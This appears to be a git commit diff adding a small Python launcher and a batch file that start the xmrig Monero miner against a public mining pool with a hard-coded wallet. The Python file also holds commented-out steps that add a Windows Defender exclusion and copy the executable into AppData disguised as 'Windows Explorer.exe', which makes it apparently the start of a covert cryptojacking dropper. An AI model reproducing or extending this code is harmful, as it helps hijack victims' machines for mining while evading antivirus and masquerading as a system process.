769efbc766844d86adf1874a60c8dfe5b90cb911
Alexander Senchin <osenchyn@gmail.com>
2022-04-21 13:21:03 +0300

    first commit

---
+++ run.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python3
+
+import os
+import shutil
+import sys
+import subprocess
+
+
+#subprocess.run('Add-MpPreference -ExclusionPath "D:\"')
+
+
+
+
+#os.system('Add-MpPreference -ExclusionPath "D:\"')
+
+
+
+
+#[+] Checked
+#location = os.environ["appdata"] + "\\Windows Explorer.exe"
+#shutil.copyfile(sys.executable, location)
+os.system('%cd%' + '/start.cmd')
---
+++ start.cmd
@@ -0,0 +1,3 @@
+@echo off
+xmrig.exe -o pool.minexmr.com:443 -u 4AsNZeyDp5WcZX5XwV4XFkHkc6dq2KFJx8yYuYikwG7cS3MvAsopsH99q9VhguRFJE8KQEjr4doyPJjZmH7Y5NpLENFiXoh -k --tls --rig-id testRig
+pause
